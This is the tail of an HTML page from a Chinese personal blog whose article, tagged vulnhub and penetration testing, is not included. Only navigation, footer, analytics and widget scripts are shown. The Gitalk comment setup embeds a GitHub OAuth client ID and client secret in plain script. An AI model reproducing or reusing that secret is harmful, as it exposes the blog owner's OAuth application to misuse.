+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/07/01/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            漏洞汇总
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/06/28/ctfshow/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ctfshow</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
